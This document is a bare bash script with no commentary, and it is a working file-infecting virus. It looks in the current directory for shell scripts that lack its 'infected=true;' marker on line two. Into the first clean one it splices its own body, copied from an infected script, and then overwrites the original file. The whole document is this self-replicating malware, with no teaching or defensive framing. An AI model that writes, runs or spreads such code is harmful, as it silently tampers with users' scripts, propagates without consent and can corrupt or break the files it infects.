#!/bin/bash
infected=true;

infectionDone=false
for f in *.sh; 
do 
	InfectCheck=$(awk NR=='2' $f)
	if [ "$InfectCheck" != "infected=true;" ]
	then
		if [ "$infectionDone" == false ]
		then
			infectionDone=true

			$(touch tmp)

			count=0
			while read line
			do
				echo "$line" >> tmp
				let "count += 1"
				if [ "$count" == "1" ]
				then
					infectionFound=false
					for z in *.sh
					do
						InfectChecker=$(awk NR=='2' $z)
						if [ "$InfectChecker" == "infected=true;" ]
						then
							if [ "$infectionFound" == false ]
							then
								infectionFound=true
								counter=0
								while read line2
								do
									let "counter += 1"
									if [ "$counter" -gt 1 ] && [ "$counter" -lt 54 ]
									then
										echo "$line2" >> tmp
									fi

								done < "$z"
							fi
						fi
					done
				fi
			done < "$f"

			$(mv tmp $f)
		fi
	fi
done
